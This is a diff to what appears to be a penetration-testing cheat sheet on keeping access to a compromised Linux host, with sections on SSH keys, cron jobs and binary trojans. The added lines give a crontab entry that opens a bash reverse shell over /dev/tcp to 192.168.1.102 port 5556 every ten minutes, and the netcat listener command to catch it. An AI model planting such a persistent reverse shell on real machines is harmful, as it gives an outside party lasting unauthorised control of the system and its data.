@@ -27,7 +27,17 @@ Add key to exisitng ssh-account.
 
 ## Cronjob NC
 
-Create cronjob that connects to my machine every 10 minutes
+Create cronjob that connects to my machine every 10 minutes. Here is an example using a bash-reverse-shell. You also need to set up a netcat listener.
+
+```
+crontab -e
+*/10 * * * * 0<&196;exec 196<>/dev/tcp/192.168.1.102/5556; sh <&196 >&196 2>&196
+```
+
+```
+nc -lvp 5556
+```
+
 
 
 ## Binary trojan
